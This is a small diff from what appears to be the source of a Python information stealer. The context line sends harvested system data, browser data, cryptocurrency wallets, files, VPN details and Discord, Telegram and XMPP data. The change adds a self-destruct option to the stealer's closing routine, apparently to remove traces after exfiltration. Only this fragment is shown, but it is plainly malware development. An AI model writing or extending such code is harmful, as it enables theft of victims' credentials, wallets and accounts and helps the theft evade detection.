@@ -101,7 +101,7 @@ def End() -> None:
         send.Send(Config.sendType,Config.np,Config.msgSYS,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
     except Exception as e:
         print(e)
-    ending.End(Config.np)
+    ending.End(Config.np, Config.selfDestruct)
 
 def Main()-> None:
     Start()
